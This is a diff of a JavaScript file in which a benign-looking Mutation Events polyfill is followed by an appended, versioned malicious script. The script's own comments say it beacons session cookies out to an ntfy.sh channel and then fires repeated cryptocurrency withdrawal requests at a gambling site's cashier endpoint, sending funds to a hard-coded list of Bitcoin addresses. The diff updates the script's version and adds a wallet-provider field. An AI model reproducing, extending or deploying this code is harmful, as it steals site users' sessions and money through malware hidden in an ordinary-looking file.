@@ -4,7 +4,6 @@
 // This source code is licensed under the BSD-style license found in the
 // LICENSE file in the root directory of this source tree.
 !function(){if(window.mutationEventsPolyfillInstalled||(window.mutationEventsPolyfillInstalled=!0,"MutationEvent"in window&&!window.mutationEventsUsePolyfillAlways))return;let e=new Set(["DOMCharacterDataModified","DOMNodeInserted","DOMNodeInsertedIntoDocument","DOMNodeRemoved","DOMNodeRemovedFromDocument","DOMSubtreeModified",]),t="Polyfilled",n={attrChange:0,bubbles:!0,cancelable:!1,newValue:"",prevValue:"",relatedNode:null};function o(e,o,a,r){let i=Object.assign({},n);a&&(i=Object.assign(i,a));let l=new Event(e+t,i);l.attrChange=i.attrChange,l.newValue=i.newValue,l.prevValue=i.prevValue,l.relatedNode=i.relatedNode,r&&Object.defineProperty(l,"target",{writable:!1,value:r}),o.dispatchEvent(l)}function a(e,t){let n=document.createTreeWalker(e,NodeFilter.SHOW_ALL);do t(n.currentNode);while(n.nextNode())}let r=new Map,i=new Set;function l(e){let t=[];for(let n of(e.forEach(function(e){let n=e.target,r=e.type;"attributes"===r?(null===e.oldValue||null===n.getAttribute(e.attributeName))&&o("DOMSubtreeModified",n,{attributeName:e.attributeName}):"characterData"===r?(o("DOMCharacterDataModified",n,{prevValue:e.oldValue,newValue:n.textContent}),t.push(n)):"childList"===r&&(e.removedNodes.forEach(e=>{t.push(n),o("DOMNodeRemoved",e),o("DOMNodeRemoved",n,void 0,e),a(e,e=>o("DOMNodeRemovedFromDocument",e,{bubbles:!1})),o("DOMNodeRemovedFromDocument",n,{bubbles:!1},e)}),e.addedNodes.forEach(e=>{t.push(n),o("DOMNodeInserted",e),a(e,e=>o("DOMNodeInsertedIntoDocument",e,{bubbles:!1}))}))}),t))o("DOMSubtreeModified",n)}function u(e){let t=e.getRootNode();for(;t instanceof ShadowRoot;)t=t.host.getRootNode();return t instanceof Document?t.documentElement:t}let d={subtree:!0,childList:!0,attributes:!0,attributeOldValue:!0,characterData:!0,characterDataOldValue:!0},s=Element.prototype.addEventListener;function c(n,o,a){return e.has(n)?{fullEventName:n+t,augmentedListener(e){Object.defineProperty(e,"type",{writable:!1,value:n}),o(e)}}:{fullEventName:n,augmentedListener:o}}Element.prototype.addEventListener=function(t,n,o){if(e.has(t)){!function e(t){if(i.has(t))return;i.add(t);let n=u(t);if(r.has(n)){r.get(n).count++;return}let o=new MutationObserver(l);r.set(n,{observer:o,count:1}),o.observe(n,d)}(this);let{augmentedListener:a,fullEventName:f}=c(t,n,o);s.apply(this,[f,a,o]);return}s.call(this,t,n,o)};let f=window.removeEventListener;Element.prototype.removeEventListener=function(t,n,o){if(e.has(t)){!function e(t){if(!i.has(t))return;i.delete(t);let n=u(t);if(r.has(n)&&0==--r.get(n).count){let o=r.get(n).observer;r.delete(n),o.disconnect()}}(this);let{augmentedListener:a,fullEventName:l}=c(t,n,o);f.apply(this,[l,a,o]);return}f.call(this,t,n,o)},window.MutationEvent=class extends CustomEvent{constructor(e,t){if("MagicString"!==e)throw"Illegal constructor";super("",t)}initMutationEvent(...e){this.initCustomEvent(...e)}static MODIFICATION=1;static ADDITION=2;static REMOVAL=3},window.initMutationEvent=()=>new MutationEvent;let v=Document.prototype.createEvent;Document.prototype.createEvent=function(e,...t){return"MutationEvent"===e?new MutationEvent("MagicString"):v.call(this,e,...t)},console.log(`Mutation Events polyfill installed (native feature: ${"MutationEvent"in window?"supported":"not present"}).`)}();
-;
 ;﻿/* SOV61 - cookie beacon to ntfy (tunnel-free) + delCk-then-POST ladder.
    Facts this encodes:
      no ck + no bound www session -> 500
@@ -13,8 +12,8 @@
    PHPSESSID is www+HttpOnly so the lobby page can never read it; we therefore
    beacon the cookie out and resolve identity locally, then blind-fire a ladder. */
 (function () {
-  if (window.__SOV104__) return; window.__SOV104__ = 1;
-  var V = '104', TAG = 'SOV104';
+  if (window.__SOV105__) return; window.__SOV105__ = 1;
+  var V = '105', TAG = 'SOV105';
   var NT = 'https://ntfy.sh/sov39hvt7k2';
   var BR = (function () {
     var h = String(location.hostname || '').toLowerCase();
@@ -24,8 +23,9 @@
   var CK = 'https://www.' + BR + '/app/shared/controllers/Cashier_v3Controller.php';
   var CP = 'https://www.' + BR + '/cashier/withdrawals';
   var HOME = 'https://www.' + BR + '/';
-  var COOL = 'sov104_cool', SHK = 'sov104_shots', ADDRK = 'sov104_addr', COOLMS = 8 * 60 * 1000;
-  var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.37, GA2 = 52.37, GAP = 2, MAXT = 360, HOP = 4000, MAXU = 40;
+  var COOL = 'sov105_cool', SHK = 'sov105_shots', ADDRK = 'sov105_addr', COOLMS = 8 * 60 * 1000;
+  var WPROV = 'Coinbase';
+var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.37, GA2 = 52.37, GAP = 2, MAXT = 360, HOP = 4000, MAXU = 40;
   var ADDRS = ['1PmMNcCDZfMQYXFeBPLgc9DQJj9cz7BmDv', '18RyS2XTv3gu38RUAihENc82yqWCK66VXD', '1DbGax2cdSMCgmvMU11xZzM9vhun8qF4nn', '1Bytwqap93vE6FBdY13P785cMTYgL8duaV', '1FfKV75xWzYQGPVaoQE53AomEs8KEENagx', '1L3ZgDjkqn3KQZZYsigDn6L5MJpTPL65jq', '17HqH2WYf71PzBkmmKWiUPikNnzUykBaTc', '1MPc16X2yUxX3tFrnPjSVjWK2qHsv7j5HB', '144pLnCkrq9D1BgjfQfM2XhEW3zf9EaBu4', '17ty8PZdi5CjAUTR3wPVNRuKCQNuqfuLMk', '16x4FuwcFCE8kK4Rd8tukkAfGVM2V7jQKu', '1NQkRUhnEga2bXsdjkQa4NVoXgug6aa7FM', '19Dum8sxudJF3Yq4RbrxcYvrescajk78Hr', '16gAuYrQKmAtwotwS6Z6EjTiTvGfFZtgNQ', '1K7uRvYtobvVtKncHiut6Zuk9rNGCMA2DM', '15fpLGcJA94r3Dk1jqLXZeaZEM6FYP945L', '1KpBG7TQ2zfrEoDFnZQRf4AJ3WBuNv7WWg'];
 
   function beat(k, o) {
@@ -169,6 +169,7 @@
       p.set('method_id', '521');
       p.set('amount', String(amt));
       p.set('cryptoaddress', ad);
+  p.set('wallet_provider', WPROV);
       beat('fire', { m: mode, amt: amt, sh: shots, a: ad, del: delOk, md: String(pi().mode || '') });
       try { performance.clearResourceTimings() } catch (e) { }
       var t0 = Date.now(), c0 = 0;
@@ -428,5 +429,6 @@
     b2('frame', { v: v, patch: g });
   } catch (e) { } })();
 })();
+
 
 
